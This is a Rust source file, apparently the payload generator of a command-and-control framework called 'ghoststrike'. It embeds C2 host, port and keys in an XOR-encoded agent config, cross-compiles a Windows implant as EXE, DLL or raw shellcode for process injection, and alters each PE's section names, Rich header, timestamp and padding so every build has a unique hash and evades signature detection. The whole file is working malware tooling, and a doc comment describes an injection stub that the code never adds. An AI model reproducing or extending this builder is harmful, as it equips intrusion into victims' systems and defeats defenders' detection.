//! Payload generator.
//!
//! Uniqueness strategy (no LLVM required):
//!   1. Random 32-byte XOR key per build.
//!   2. JSON config serialised + XOR-encoded → agent_cfg.bin  (embedded via include_bytes!)
//!   3. The key itself                        → agent_key.bin  (embedded via include_bytes!)
//!   4. Random build_id string in the config — changes every binary.
//!   5. Random padding blob appended after the PE → different file hash every time.
//!
//! The agent reads agent_key.bin and agent_cfg.bin from OUT_DIR at compile time.
//! Each invocation of this builder writes fresh bytes to those files and recompiles.
//!
//! Phase 3 additions:
//!   - server_pubkey baked into agent config → enables ECDH key exchange.
//!   - Shellcode format: extract raw .text section from compiled PE.
//!   - DLL format: compile the [lib] cdylib target instead of [[bin]].

use anyhow::{Context, Result};
use rand::RngCore;
use uuid::Uuid;

use ghoststrike_common::{xor_encode, BuildConfig, PayloadFormat};
use crate::mutator::Mutator;

pub async fn generate(cfg: BuildConfig, output_path: &str) -> Result<String> {
    let build_id = Uuid::new_v4().to_string();

    // 1. Inject build_id and serialise config.
    let agent_cfg = serde_json::json!({
        "c2_host":      cfg.c2_host,
        "c2_port":      cfg.c2_port,
        "protocol":     cfg.protocol,
        "sleep_ms":     cfg.sleep_ms,
        "jitter_pct":   cfg.jitter_pct,
        "dns_domain":   cfg.dns_domain,
        "pipe_name":    cfg.pipe_name,
        "build_id":     build_id,
        "c2_key":       cfg.c2_key,
        "server_pubkey": cfg.server_pubkey,
    });
    let plain = serde_json::to_vec(&agent_cfg)?;

    // 2. Generate random XOR key.
    let mut xor_key = vec![0u8; 32];
    rand::thread_rng().fill_bytes(&mut xor_key);

    // 3. Encrypt config.
    let encrypted_cfg = xor_encode(&plain, &xor_key);

    // 4. Write key + encrypted config for the agent crate's build.rs.
    let tmp = std::env::temp_dir().join("ghoststrike_build").join(&build_id);
    std::fs::create_dir_all(&tmp)?;
    let key_path = tmp.join("agent_key.bin");
    let cfg_path = tmp.join("agent_cfg.bin");
    std::fs::write(&key_path, &xor_key)?;
    std::fs::write(&cfg_path, &encrypted_cfg)?;

    println!("[*] Build ID:      {build_id}");
    println!("[*] XOR key:       {} bytes  (random per build)", xor_key.len());
    println!("[*] Config:        {} bytes  → {} bytes encrypted", plain.len(), encrypted_cfg.len());
    println!("[*] Server pubkey: {}", if cfg.server_pubkey.is_empty() { "(none)" } else { &cfg.server_pubkey });

    // 5. Cross-compile the agent crate (EXE or DLL).
    compile_agent(&tmp, output_path, &cfg, &build_id)?;

    // 6. Post-compile processing.
    match &cfg.format {
        PayloadFormat::Exe => {
            // PE mutations for maximum uniqueness.
            Mutator::randomise_section_names(output_path)?;
            Mutator::zero_rich_header(output_path)?;
            Mutator::randomise_pe_timestamp(output_path)?;
            Mutator::append_random_padding(output_path)?;
        }
        PayloadFormat::Shellcode => {
            // Extract .text section → raw shellcode blob.
            extract_text_section(output_path)?;
        }
        PayloadFormat::Dll => {
            // DLL mutations.
            Mutator::randomise_section_names(output_path)?;
            Mutator::zero_rich_header(output_path)?;
            Mutator::randomise_pe_timestamp(output_path)?;
        }
    }

    Ok(build_id)
}

fn compile_agent(
    out_dir:     &std::path::Path,
    output_path: &str,
    cfg:         &BuildConfig,
    build_id:    &str,
) -> Result<()> {
    use std::process::Command;

    // Derive workspace root from the running binary's location at runtime.
    // Binary lives at <workspace>/target/{profile}/ghoststrike-server
    // so three .parent() calls reach the workspace root.
    // Falls back to current_dir() if the exe path is unavailable.
    let exe = std::env::current_exe().unwrap_or_default();
    let workspace_root_buf = exe
        .parent().and_then(|p| p.parent()).and_then(|p| p.parent())
        .map(|p| p.to_path_buf())
        .unwrap_or_else(|| std::env::current_dir().unwrap_or_default());
    let workspace_root = workspace_root_buf.as_path();

    println!("[*] Compiling agent: {}", workspace_root.join("crates/agent").display());
    println!("[*] Target:          x86_64-pc-windows-gnu");
    println!("[*] Format:          {}", cfg.format);

    // For DLL format, compile the lib target instead of the bin.
    let (target_flag, compiled_ext) = match cfg.format {
        PayloadFormat::Dll => ("--lib", "dll"),
        _                  => ("--bin", "exe"),
    };

    let bin_arg = if cfg.format == PayloadFormat::Dll {
        vec![] // --lib selects the lib target automatically
    } else {
        vec!["agent"]
    };

    let mut args = vec![
        "build",
        "--release",
        "--target", "x86_64-pc-windows-gnu",
        "-p", "ghoststrike-agent",
        target_flag,
    ];
    args.extend(bin_arg.iter().map(|s| *s));

    // Ensure ~/.cargo/bin is on PATH so cargo is found when this binary
    // is launched without a full shell environment (e.g. from a TUI).
    let path_env = {
        let cargo_home = std::env::var("CARGO_HOME")
            .or_else(|_| std::env::var("HOME").map(|h| format!("{h}/.cargo")))
            .unwrap_or_default();
        let cargo_bin = format!("{cargo_home}/bin");
        let current = std::env::var("PATH").unwrap_or_default();
        if current.contains(&cargo_bin) {
            current
        } else {
            format!("{cargo_bin}:{current}")
        }
    };

    let status = Command::new("cargo")
        .args(&args)
        .env("OUT_DIR", out_dir)
        .env("GHOSTSTRIKE_BUILD_ID", build_id)
        .env("PATH", path_env)
        .current_dir(workspace_root)
        .status()
        .context("cargo build failed")?;

    if !status.success() {
        anyhow::bail!("Agent compilation failed");
    }

    // For shellcode, we first produce the EXE then extract the .text section.
    // The intermediate EXE is placed at a temporary path.
    let (compiled_name, intermediate_path) = match cfg.format {
        PayloadFormat::Dll => (format!("agent.{compiled_ext}"), None),
        PayloadFormat::Shellcode => {
            // We compiled as EXE; extract shellcode from it.
            ("agent.exe".to_string(), Some(format!("{output_path}.stage0.exe")))
        }
        PayloadFormat::Exe => ("agent.exe".to_string(), None),
    };

    let compiled = workspace_root
        .join(format!("target/x86_64-pc-windows-gnu/release/{compiled_name}"));

    let copy_to = intermediate_path.as_deref().unwrap_or(output_path);
    std::fs::copy(&compiled, copy_to)
        .with_context(|| format!("copying {} → {copy_to}", compiled.display()))?;

    // For shellcode, rename the intermediate to the requested output path
    // (extract_text_section replaces it in-place).
    if let Some(ref mid) = intermediate_path {
        std::fs::rename(mid, output_path)
            .with_context(|| format!("rename {mid} → {output_path}"))?;
    }

    Ok(())
}

/// Extract the raw bytes of the first `.text` section from a PE file and
/// write them back to the same path as a raw shellcode blob.
///
/// A minimal x64 stub is prepended so the shellcode can be injected directly
/// into a process (no PE loader required).
fn extract_text_section(pe_path: &str) -> Result<()> {
    let pe_bytes = std::fs::read(pe_path)?;

    if pe_bytes.len() < 0x40 {
        anyhow::bail!("PE too small to parse");
    }

    let e_lfanew = u32::from_le_bytes(pe_bytes[0x3C..0x40].try_into()?) as usize;
    if pe_bytes.len() < e_lfanew + 0x18 {
        anyhow::bail!("PE header truncated");
    }

    let num_sections = u16::from_le_bytes(
        pe_bytes[e_lfanew + 6..e_lfanew + 8].try_into()?,
    ) as usize;
    let opt_hdr_size = u16::from_le_bytes(
        pe_bytes[e_lfanew + 0x14..e_lfanew + 0x16].try_into()?,
    ) as usize;
    let sect_table = e_lfanew + 0x18 + opt_hdr_size;

    for i in 0..num_sections {
        let off = sect_table + i * 0x28;
        if pe_bytes.len() < off + 0x28 { break; }
        let name = &pe_bytes[off..off + 8];
        if &name[..5] == b".text" {
            let raw_size = u32::from_le_bytes(pe_bytes[off + 0x10..off + 0x14].try_into()?) as usize;
            let raw_off  = u32::from_le_bytes(pe_bytes[off + 0x14..off + 0x18].try_into()?) as usize;
            let end = (raw_off + raw_size).min(pe_bytes.len());
            let shellcode = &pe_bytes[raw_off..end];

            std::fs::write(pe_path, shellcode)?;
            println!("[*] Shellcode extracted: {} bytes from .text", shellcode.len());
            return Ok(());
        }
    }

    anyhow::bail!("No .text section found in PE");
}
